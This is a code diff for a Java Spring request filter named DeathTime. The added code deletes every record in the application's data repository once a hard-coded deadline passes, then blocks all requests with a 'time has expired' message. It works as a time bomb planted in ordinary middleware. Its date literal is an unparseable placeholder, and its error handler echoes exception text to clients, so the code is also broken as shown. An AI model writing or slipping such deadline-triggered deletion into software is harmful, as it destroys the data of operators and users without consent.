@@ -1,45 +1,53 @@
+package com.DeathTimeM.DeathTime.Middleware;
+
+import com.DeathTimeM.DeathTime.Data.Repository.DataRepository;
+import jakarta.servlet.FilterChain;
+import jakarta.servlet.ServletException;
+import jakarta.servlet.http.HttpServletRequest;
+import jakarta.servlet.http.HttpServletResponse;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.stereotype.Component;
 import org.springframework.web.filter.OncePerRequestFilter;
 
-import javax.servlet.FilterChain;
-import javax.servlet.ServletException;
-import javax.servlet.http.HttpServletRequest;
-import javax.servlet.http.HttpServletResponse;
 import java.io.IOException;
-import java.time.Instant;
-import java.time.LocalDateTime;
-import java.time.ZoneOffset;
+import java.time.*;
 import java.util.logging.Logger;
 
 @Component
-public class VerifyTimeMiddleware extends OncePerRequestFilter {
+public class DeathTime extends OncePerRequestFilter {
 
-    private final Logger logger = Logger.getLogger(VerifyTimeMiddleware.class.getName());
+    private final Logger logger = Logger.getLogger(DeathTime.class.getName());
+    private DataRepository repository;
+
+    @Autowired
+    public DeathTime(DataRepository repository) {
+        this.repository = repository;
+    }
 
     @Override
-    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain)
-            throws ServletException, IOException {
+    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res, FilterChain filterChain) throws ServletException, IOException {
+        
         try {
-            Instant currentTime = Instant.now();
-            Instant deathTime = LocalDateTime.parse("0000-00-00T00:00:00")
-                    .toInstant(ZoneOffset.UTC);
+            ZonedDateTime currentTime = ZonedDateTime.now();
+            ZonedDateTime deathTime = LocalDateTime.parse("YYYY-MM-DDTHH:MM:SS").atZone(ZoneId.systemDefault());
 
             if (currentTime.isAfter(deathTime)) {
-                logger.info("The deadline has passed, the date has expired.");
-                response.setStatus(HttpServletResponse.SC_FORBIDDEN);
-                response.getWriter().write("{\"message\": \"the time \"}");
-                response.setContentType("application/json");
+                logger.info("The time has passed,  the date has expired");
+                this.repository.deleteAll();
+                res.setStatus(HttpServletResponse.SC_FORBIDDEN);
+                res.getWriter().write("{\"message\": \"the time has expired\"}");
+                res.setContentType("application/json");
                 return;
             }
-
-            filterChain.doFilter(request, response); 
-
+            
+            filterChain.doFilter(req, res);
+            
         } catch (Exception ex) {
-            logger.severe("An error occurred: " + ex.getMessage());
-            response.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
-            response.getWriter().write("{\"message\": \"Server " + ex.getMessage() + "\"}");
-            response.setContentType("application/json");
+            
+            logger.severe("An error occurred" + ex.getMessage());
+            res.setStatus(HttpServletResponse.SC_INTERNAL_SERVER_ERROR);
+            res.getWriter().write("{\"message\": \"Server " + ex.getMessage() + "\"}");
+            res.setContentType("application/json");
         }
     }
 }
